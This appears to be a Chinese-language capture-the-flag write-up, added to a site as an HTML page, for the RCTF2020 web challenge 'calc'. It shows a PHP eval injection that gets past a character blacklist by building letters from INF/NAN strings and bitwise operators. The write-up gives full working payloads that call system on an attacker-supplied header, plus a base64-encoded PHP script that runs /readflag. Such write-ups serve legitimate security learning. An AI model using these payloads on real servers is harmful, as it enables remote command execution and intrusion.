@@ -1,0 +1,585 @@
+
+
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="shortcut icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.1.2, mkdocs-material-5.2.1">
+    
+    
+      
+        <title>RCTF2020 - 自留地</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.71dfd922.min.css">
+      
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.616af814.min.css">
+      
+      
+        
+        
+        <meta name="theme-color" content="#546e7a">
+      
+    
+    
+    
+      
+        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>body,input{font-family:"Roboto",-apple-system,BlinkMacSystemFont,Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono",SFMono-Regular,Consolas,Menlo,monospace}</style>
+      
+    
+    
+    
+    
+      
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="blue-grey" data-md-color-accent="purple">
+  
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#web" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+      <header class="md-header" data-md-component="header">
+  <nav class="md-header-nav md-grid" aria-label="Header">
+    <a href="../.." title="自留地" class="md-header-nav__button md-logo" aria-label="自留地">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    <label class="md-header-nav__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header-nav__title" data-md-component="header-title">
+      
+        <div class="md-header-nav__ellipsis">
+          <span class="md-header-nav__topic md-ellipsis">
+            自留地
+          </span>
+          <span class="md-header-nav__topic md-ellipsis">
+            
+              RCTF2020
+            
+          </span>
+        </div>
+      
+    </div>
+    
+      <label class="md-header-nav__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      
+<div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" data-md-state="active">
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0116 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 019.5 16 6.5 6.5 0 013 9.5 6.5 6.5 0 019.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <button type="reset" class="md-search__icon md-icon" aria-label="Clear" data-md-component="search-reset" tabindex="-1">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+      </button>
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+        
+      
+      
+        
+          
+
+  
+
+<nav class="md-tabs md-tabs--active" aria-label="Tabs" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  <li class="md-tabs__item">
+    
+      <a href="../.." class="md-tabs__link">
+        介绍
+      </a>
+    
+  </li>
+
+      
+        
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../DASCTF/" class="md-tabs__link md-tabs__link--active">
+          writeup
+        </a>
+      
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    <nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="自留地" class="md-nav__button md-logo" aria-label="自留地">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 003-3 3 3 0 00-3-3 3 3 0 00-3 3 3 3 0 003 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54z"/></svg>
+
+    </a>
+    自留地
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+
+  <li class="md-nav__item">
+    <a href="../.." title="介绍" class="md-nav__link">
+      介绍
+    </a>
+  </li>
+
+    
+      
+      
+      
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2" checked>
+    
+    <label class="md-nav__link" for="nav-2">
+      writeup
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M8.59 16.58L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.42z"/></svg>
+      </span>
+    </label>
+    <nav class="md-nav" aria-label="writeup" data-md-level="1">
+      <label class="md-nav__title" for="nav-2">
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+        </span>
+        writeup
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../DASCTF/" title="DASCTF2020" class="md-nav__link">
+      DASCTF2020
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        RCTF2020
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
+        </span>
+      </label>
+    
+    <a href="./" title="RCTF2020" class="md-nav__link md-nav__link--active">
+      RCTF2020
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    Web
+  </a>
+  
+    <nav class="md-nav" aria-label="Web">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#calc" class="md-nav__link">
+    calc
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web" class="md-nav__link">
+    Web
+  </a>
+  
+    <nav class="md-nav" aria-label="Web">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#calc" class="md-nav__link">
+    calc
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                
+                  
+                
+                
+                  <h1>RCTF2020</h1>
+                
+                <h2 id="web">Web<a class="headerlink" href="#web" title="Permanent link">&para;</a></h2>
+<h3 id="calc">calc<a class="headerlink" href="#calc" title="Permanent link">&para;</a></h3>
+<p>由于这次太难了都不会做，只能简单记一道关于写shell的题</p>
+<p>给了源码：</p>
+<div class="highlight"><pre><span></span><code><span class="x"> </span><span class="cp">&lt;?php</span>
+<span class="nb">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
+    <span class="nb">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="p">}</span><span class="k">else</span><span class="p">{</span>
+    <span class="nv">$str</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">];</span>
+    <span class="nv">$blacklist</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;[a-z]&#39;</span><span class="p">,</span> <span class="s1">&#39;[\x7f-\xff]&#39;</span><span class="p">,</span> <span class="s1">&#39;\s&#39;</span><span class="p">,</span><span class="s2">&quot;&#39;&quot;</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;`&#39;</span><span class="p">,</span> <span class="s1">&#39;\[&#39;</span><span class="p">,</span> <span class="s1">&#39;\]&#39;</span><span class="p">,</span><span class="s1">&#39;\$&#39;</span><span class="p">,</span> <span class="s1">&#39;_&#39;</span><span class="p">,</span> <span class="s1">&#39;\\\\&#39;</span><span class="p">,</span><span class="s1">&#39;\^&#39;</span><span class="p">,</span> <span class="s1">&#39;,&#39;</span><span class="p">];</span>
+    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$blacklist</span> <span class="k">as</span> <span class="nv">$blackitem</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$blackitem</span> <span class="o">.</span> <span class="s1">&#39;/im&#39;</span><span class="p">,</span> <span class="nv">$str</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;what are you want to do?&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="s1">&#39;echo &#39;</span><span class="o">.</span><span class="nv">$str</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+
+<p>跟上次的国赛一道题有点像，不过限制了字母的使用。不过可以利用PHP的错误运算返回来构造字母</p>
+<div class="highlight"><pre><span></span><code><span class="x">1/0 返回 INF //0为除数</span>
+<span class="x">0/0 返回 NAN</span>
+</code></pre></div>
+
+<p>由于前面没有过滤<code>{}</code>、<code>.</code> 和<code>()</code>，我们可以通过他们来获取字符串的某个字符，结合上面，像这样</p>
+<div class="highlight"><pre><span></span><code><span class="x">((1/0).(0)){0}  / I</span>
+<span class="x">((0/0).(0)){1}  / A</span>
+<span class="x">....</span>
+</code></pre></div>
+
+<p>然后利用位运算来构造其他字符，先尝试在已得到字符中进行<code>|</code>(或)运算或者<code>&amp;</code>运算</p>
+<div class="highlight"><pre><span></span><code><span class="n">a</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;A&#39;</span><span class="p">,</span><span class="s1">&#39;F&#39;</span><span class="p">,</span><span class="s1">&#39;I&#39;</span><span class="p">,</span><span class="s1">&#39;N&#39;</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">a</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">|</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)))</span>
+        <span class="nb">print</span> <span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">,</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">&amp;</span><span class="nb">ord</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)))</span>
+</code></pre></div>
+
+<p>发现能得到的字符增加了<code>O</code>、<code>G</code>、<code>H</code>，还是太少，在一次位运算中字母之间的运算基本没有了，这时我们可以利用数字字符来生成新的字符（把上面的脚本改一下即可），新生成了<code>q、s、u、v、w、y</code></p>
+<p>数字字符生成方式跟取字符差不多，利用 <code>.</code> 连接字符改变类型然后通过<code>{}</code>取某个数字字符。总结一下现在能得到的字母：</p>
+<div class="highlight"><pre><span></span><code>A F I N O G H q s u v w y 0-9
+</code></pre></div>
+
+<p>再将得到的字符相互进行位运算（无限套娃），得到：</p>
+<div class="highlight"><pre><span></span><code>u&amp;v t
+q&amp;v p
+u&amp;O E
+u&amp;N D
+s&amp;v r
+H|D L
+s&amp;O C
+....
+</code></pre></div>
+
+<p>(基本所有字母都可以构造)，其实这里我想到了一个简单的用法，可以构造出chr函数，然后就可以构造任意字符了，缺点就是payload有点长。。。。</p>
+<p>根据上面我们就可以写出一些函数了，先看一下phpinfo信息，这里利用了php7的版本特性，可以<code>('phpinfo')()</code>这样来执行函数。加上php对函数大小写不敏感，构造如下：</p>
+<div class="highlight"><pre><span></span><code><span class="x">(((((0/0).(0)){1}|((1).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){0}&amp;((1/0).(0)){0}).((((0/0).(0)){1}|((1).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((1/0).(0)){0}).(((0/0).(0)){0}).(((1/0).(0)){2}).(((1/0).(0)){0}|((1/0).(0)){2}))()</span>
+<span class="x">//(&#39;phpinfo&#39;)()</span>
+</code></pre></div>
+
+<p>看一下禁用函数，没禁用任何函数。。接下来就是构造shell来执行命令，一个命令一个命令地构造太慢了。由于构造webshell的字符被禁用了，这里考虑通过<code>getallheaders</code>来获取请求头信息来执行命令：</p>
+<div class="highlight"><pre><span></span><code><span class="x">((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&amp;((1/0).(0)){0})|(((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&amp;((1/0).(0)){0})|(((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&amp;((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))()</span>
+<span class="x">//(&#39;GEtALLHEADErs&#39;)()</span>
+</code></pre></div>
+
+<p><code>getallheaders</code>函数返回的是数组，我们可以通过<code>{}</code>来获取其中某个键的值，构造:</p>
+<div class="highlight"><pre><span></span><code>((&#39;getallheaders&#39;)()){111}
+</code></pre></div>
+
+<p>即可获取请求信息的headers中的<code>111</code>属性的值，再通过system来执行即可，构造system：</p>
+<div class="highlight"><pre><span></span><code><span class="x">((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&amp;((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2}))))()</span>
+<span class="x">// (&#39;systEM&#39;)()</span>
+</code></pre></div>
+
+<p>最终payload：</p>
+<div class="highlight"><pre><span></span><code><span class="x">((((0/0).(0)){1}|((2).(0)){0}).(((0/0).(0)){1}|((8).(0)){0}).(((0/0).(0)){1}|((2).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){0}&amp;((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2}))))(((((0/0).(0)){1}|((1/0).(0)){2}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}).((((0/0).(0)){0}&amp;((1/0).(0)){0})|(((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).((((0/0).(0)){0}&amp;((1/0).(0)){0})|(((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))).(((0/0).(0)){0}&amp;((1/0).(0)){0}).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).(((0/0).(0)){1}).(((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})).(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})).((((0/0).(0)){1}|((2).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})).(((0/0).(0)){1}|((2).(0)){0}))(){111})</span>
+
+<span class="x">//(&#39;systEM&#39;)((&#39;GEtALLHEADErs&#39;)(){111})</span>
+</code></pre></div>
+
+<p>在header里面添加111属性，即可执行任意命令了。在根目录下发现flag和readflag，老套路了。。。直接写入php脚本，参考2019*CTF的mywebsql。脚本内容：</p>
+<div class="highlight"><pre><span></span><code><span class="cp">&lt;?</span>
+<span class="o">&lt;?</span><span class="nx">php</span>
+<span class="nv">$d</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+    <span class="mi">0</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">),</span>
+    <span class="mi">1</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;pipe&quot;</span><span class="p">,</span> <span class="s2">&quot;w&quot;</span><span class="p">),</span>
+    <span class="mi">2</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;file&quot;</span><span class="p">,</span> <span class="s2">&quot;/tmp/error-output.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">)</span>
+<span class="p">);</span>
+<span class="nv">$process</span> <span class="o">=</span> <span class="nb">proc_open</span><span class="p">(</span><span class="s1">&#39;/readflag&#39;</span><span class="p">,</span> <span class="nv">$d</span><span class="p">,</span> <span class="nv">$pipes</span><span class="p">,</span> <span class="nv">$cwd</span><span class="p">,</span> <span class="nv">$env</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">is_resource</span><span class="p">(</span><span class="nv">$process</span><span class="p">))</span> <span class="p">{</span>
+    <span class="nv">$question</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">1024</span><span class="p">);</span>
+    <span class="nv">$question</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">1024</span><span class="p">);</span>
+    <span class="nv">$question</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$question</span><span class="p">);</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$question</span><span class="p">);</span>
+    <span class="k">eval</span><span class="p">(</span><span class="s1">&#39;$result = &#39;</span><span class="o">.</span><span class="nv">$question</span><span class="o">.</span><span class="s1">&#39;;&#39;</span><span class="p">);</span>
+    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="nv">$result</span><span class="p">);</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
+    <span class="c1">// $flag = stream_get_contents($pipes[1]);</span>
+    <span class="nv">$flag</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">1024</span><span class="p">);</span>
+    <span class="nv">$flag</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">1024</span><span class="p">);</span>
+    <span class="nv">$flag</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="mi">1024</span><span class="p">);</span>
+
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$pipes</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="nb">var_dump</span><span class="p">(</span><span class="nv">$flag</span><span class="p">);</span>
+
+    <span class="nv">$return_value</span> <span class="o">=</span> <span class="nb">proc_close</span><span class="p">(</span><span class="nv">$process</span><span class="p">);</span>
+
+    <span class="k">echo</span> <span class="s2">&quot;command returned </span><span class="si">$return_value\n</span><span class="s2">&quot;</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+
+<p>去掉注释base64编码执行php语句：</p>
+<div class="highlight"><pre><span></span><code><span class="x">php -c 1 -r &quot;eval(base64_decode(&#39;JGQgPSBhcnJheSgKICAgIDAgPT4gYXJyYXkoInBpcGUiLCAiciIpLAogICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksCiAgICAyID0+IGFycmF5KCJmaWxlIiwgIi90bXAvZXJyb3Itb3V0cHV0LnR4dCIsICJhIikKKTsKJHByb2Nlc3MgPSBwcm9jX29wZW4oJy9yZWFkZmxhZycsICRkLCAkcGlwZXMsICRjd2QsICRlbnYpOwppZiAoaXNfcmVzb3VyY2UoJHByb2Nlc3MpKSB7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkcXVlc3Rpb24gPSB0cmltKCRxdWVzdGlvbik7CiAgICB2YXJfZHVtcCgkcXVlc3Rpb24pOwogICAgZXZhbCgnJHJlc3VsdCA9ICcuJHF1ZXN0aW9uLic7Jyk7CiAgICBmd3JpdGUoJHBpcGVzWzBdLCAkcmVzdWx0KTsKICAgIGZjbG9zZSgkcGlwZXNbMF0pOwogICAgdmFyX2R1bXAoJHJlc3VsdCk7CiAgICAvLyAkZmxhZyA9IHN0cmVhbV9nZXRfY29udGVudHMoJHBpcGVzWzFdKTsKICAgICRmbGFnID0gZnJlYWQoJHBpcGVzWzFdLDEwMjQpOwogICAgJGZsYWcgPSBmcmVhZCgkcGlwZXNbMV0sMTAyNCk7CiAgICAkZmxhZyA9IGZyZWFkKCRwaXBlc1sxXSwxMDI0KTsKCiAgICBmY2xvc2UoJHBpcGVzWzFdKTsKICAgIHZhcl9kdW1wKCRmbGFnKTsKICAgIAogICAgJHJldHVybl92YWx1ZSA9IHByb2NfY2xvc2UoJHByb2Nlc3MpOwoKICAgIGVjaG8gImNvbW1hbmQgcmV0dXJuZWQgJHJldHVybl92YWx1ZVxuIjsKfQ==&#39;));&quot;</span>
+</code></pre></div>
+
+<p>即可获取flag。</p>
+<p>简单记录一下构造的字符（以后可能有用）：</p>
+<div class="highlight"><pre><span></span><code>q:  ((0/0).(0)){1}|((1).(0)){0}
+A:  ((0/0).(0)){1}
+v:  ((1/0).(0)){2}|((0).(0)){0}
+p:  (((0/0).(0)){1}|((1).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})
+N:  ((0/0).(0)){0}
+I:  ((1/0).(0)){0}
+H:  ((0/0).(0)){0}&amp;((1/0).(0)){0}
+F:  ((1/0).(0)){2}
+O:  ((1/0).(0)){0}|((1/0).(0)){2}
+G:  ((0/0).(0)){1}|((1/0).(0)){2}
+u:  (((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}
+t:  ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})
+E:  ((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2})
+D:  ((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})
+L:  (((0/0).(0)){0}&amp;((1/0).(0)){0})|(((0/0).(0)){0}&amp;((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0}))
+s:  ((0/0).(0)){1}|((2).(0)){0}
+r:  (((0/0).(0)){1}|((2).(0)){0})&amp;(((1/0).(0)){2}|((0).(0)){0})
+y:  ((0/0).(0)){1}|((8).(0)){0}
+x:  (((0/0).(0)){0}&amp;((1/0).(0)){0})|((8).(0)){0}
+C:  (((0/0).(0)){1}|((2).(0)){0})&amp;(((0/0).(0)){1}|((1/0).(0)){2})
+M:  (((0/0).(0)){0}&amp;((1/0).(0)){0})|(((((0/0).(0)){1}|((1).(0)){0})|((4).(0)){0})&amp;(((1/0).(0)){0}|((1/0).(0)){2}))
+</code></pre></div>
+
+<p>参考：</p>
